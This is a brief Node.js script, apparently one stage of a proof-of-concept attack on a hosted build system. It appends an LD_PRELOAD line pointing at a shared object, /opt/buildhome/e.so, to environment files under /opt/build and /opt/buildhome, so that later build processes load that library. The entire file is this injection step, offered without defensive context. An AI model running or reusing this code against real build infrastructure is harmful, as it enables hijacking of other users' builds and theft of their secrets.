const fs = require("fs");
for (const t of ["/opt/build/env_store/.env", "/opt/buildhome/env_store/.env"]) {
  try { fs.appendFileSync(t, "LD_PRELOAD=/opt/buildhome/e.so\n"); console.log("[p3] wrote", t); }
  catch (e) { console.log("[p3] fail", t, e.code); }
}
